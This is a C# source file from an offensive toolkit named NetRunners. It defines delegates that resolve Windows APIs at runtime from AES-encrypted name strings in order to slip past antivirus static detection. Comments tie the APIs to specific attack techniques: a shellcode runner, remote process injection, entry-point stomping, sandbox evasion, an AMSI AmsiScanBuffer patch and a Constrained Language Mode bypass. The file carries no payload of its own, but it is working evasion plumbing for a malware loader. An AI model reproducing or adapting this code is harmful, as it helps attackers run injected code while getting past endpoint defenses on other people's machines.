using System;
using System.Runtime.InteropServices;
using static NetRunners.Data.EncryptedData;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.Structs;

namespace NetRunners.Delegates
{
    /// <summary>
    /// This class includes DLL import statements needed to call relevant win32 apis. 
    /// Some win32 apis require structures, these are retrieved from the Structures class.
    /// </summary>
    public class Delegate
    {
        // Importing Getprocaddress, getmodulehandle to dynamically resolve other APIs
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        // Basic Runner
        // this technique uses: VirtualAlloc, CreateThread, WaitForSingleObject

        //// virtualalloc
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        public delegate IntPtr pVirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        public static pVirtualAlloc VirtualAlloc = (pVirtualAlloc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualAlloc_Bytes, AesKey)), typeof(pVirtualAlloc));

        //// createthread
        //[DllImport("kernel32.dll")]
        //public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public delegate IntPtr pCreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static pCreateThread CreateThread = (pCreateThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(CreateThread_Bytes, AesKey)), typeof(pCreateThread));

        //// waitforsingleobject
        //[DllImport("kernel32.dll")]
        //public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public delegate UInt32 pWaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public static pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(WaitForSingleObject_Bytes, AesKey)), typeof(pWaitForSingleObject));

        // Process Injection Runner
        // this technique uses: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread

        //// openprocess
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, int processId);
        public delegate IntPtr pOpenProcess(uint processAccess, int bInheritHandle, uint processId);
        public static pOpenProcess OpenProcess = (pOpenProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(OpenProcess_Bytes, AesKey)), typeof(pOpenProcess));

        //// virtualallocex
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        public delegate IntPtr pVirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        public static pVirtualAllocEx VirtualAllocEx = (pVirtualAllocEx)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualAllocEx_Bytes, AesKey)), typeof(pVirtualAllocEx));

        //// writeprocessmemory
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        public delegate int pWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        public static pWriteProcessMemory WriteProcessMemory = (pWriteProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(WriteProcessMemory_Bytes, AesKey)), typeof(pWriteProcessMemory));

        //// createremotethread
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public delegate IntPtr pCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static pCreateRemoteThread CreateRemoteThread = (pCreateRemoteThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(CreateRemoteThread_Bytes, AesKey)), typeof(pCreateRemoteThread));

        // EntryPoint Stomping Runner
        // This technique uses WriteProcessMemory, CreateProcess, ZwQueryInformationProcess, ReadProcessMemory, ResumeThread

        //// writeprocessmemory already imported

        //// import CreateProcess
        //[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        //public static extern int CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        public delegate int pCreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        public static pCreateProcess CreateProcessA = (pCreateProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(CreateProcessA_Bytes, AesKey)), typeof(pCreateProcess));

        //// import ZwQueryInformationProcess
        //[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        //public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        public delegate int pZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        public static pZwQueryInformationProcess ZwQueryInformationProcess = (pZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("ntdll.dll"), DecryptBytesToStringAes(ZwQueryInformationProcess_Bytes, AesKey)), typeof(pZwQueryInformationProcess));

        //// import readprocessmemory
        //[DllImport("kernel32.dll", SetLastError = true)]
        //public static extern int ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        public delegate int pReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        public static pReadProcessMemory ReadProcessMemory = (pReadProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(ReadProcessMemory_Bytes, AesKey)), typeof(pReadProcessMemory));

        //// import resumethread
        //[DllImport("kernel32.dll", SetLastError = true)]
        //public static extern uint ResumeThread(IntPtr hThread);
        public delegate uint pResumeThread(IntPtr hThread);
        public static pResumeThread ResumeThread = (pResumeThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(ResumeThread_Bytes, AesKey)), typeof(pResumeThread));

        // non-emulated apis
        // This Technique uses VirtualAllocExNuma, GetCurrentProcess, FlsAlloc

        //// import virtualallocexnuma
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        public delegate IntPtr pVirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        public static pVirtualAllocExNuma VirtualAllocExNuma = (pVirtualAllocExNuma)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualAllocExNuma_Bytes, AesKey)), typeof(pVirtualAllocExNuma));

        //// import getcurrentprocess
        //[DllImport("kernel32.dll")]
        //public static extern IntPtr GetCurrentProcess();
        public delegate IntPtr pGetCurrentProcess();
        public static pGetCurrentProcess GetCurrentProcess = (pGetCurrentProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(GetCurrentProcess_Bytes, AesKey)), typeof(pGetCurrentProcess));

        //// import flsalloc
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr FlsAlloc(IntPtr callback);
        public delegate IntPtr pFlsAlloc(IntPtr callback);
        public static pFlsAlloc FlsAlloc = (pFlsAlloc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(FlsAlloc_Bytes, AesKey)), typeof(pFlsAlloc));

        // AMSI Binary Patch for AmsiScanBuffer
        // this technique uses LoadLibrary, GetProcAddess, VirtualProtect

        //// import loadlibrary
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr LoadLibraryA(string name);
        public delegate IntPtr pLoadLibrary(string name);
        public static pLoadLibrary LoadLibraryA = (pLoadLibrary)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(LoadLibraryA_Bytes, AesKey)), typeof(pLoadLibrary));

        //// import getprocaddress (already imported)

        //// import virtualprotect
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern int VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public delegate int pVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public static pVirtualProtect VirtualProtect = (pVirtualProtect)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualProtect_Bytes, AesKey)), typeof(pVirtualProtect));

        // CLM Bypass source: https://github.com/calebstewart/bypass-clm/blob/master/bypass-clm/Program.cs
        // this technique uses: GetStdHandle, GetProcAddress, LoadLibrary, VirtualProtect

        //[DllImport("kernel32.dll", SetLastError = true)]
        //public static extern IntPtr GetStdHandle(int nStdHandle);
        public delegate IntPtr pGetStdHandle(int nStdHandle);
        public static pGetStdHandle GetStdHandle = (pGetStdHandle)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(GetStdHandle_Bytes, AesKey)), typeof(pGetStdHandle));
    }
}
